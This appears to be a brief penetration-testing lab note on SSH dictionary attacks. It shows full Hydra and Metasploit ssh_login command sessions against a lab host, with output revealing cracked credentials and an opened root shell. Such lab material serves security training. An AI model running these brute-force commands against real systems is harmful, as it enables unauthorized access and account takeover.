# SSH Dictionary attack

Hydra

```
root@attackdefense:~# hydra -l student -P /usr/share/wordlists/rockyou.txt 192.49.104.3 ssh
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-25 17:18:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.49.104.3:22/
[STATUS] 176.00 tries/min, 176 tries in 00:01h, 14344223 to do in 1358:22h, 16 active
[22][ssh] host: 192.49.104.3   login: student   password: friend
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-25 17:20:13
```

Metasploit

```
msf5 > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.49.104.3
RHOSTS => 192.49.104.3
msf5 auxiliary(scanner/ssh/ssh_login) > set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
userpass_file => /usr/share/wordlists/metasploit/root_userpass.txt
msf5 auxiliary(scanner/ssh/ssh_login) > exploit

[+] 192.49.104.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (192.49.104.2:37141 -> 192.49.104.3:22) at 2023-11-25 17:39:50 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
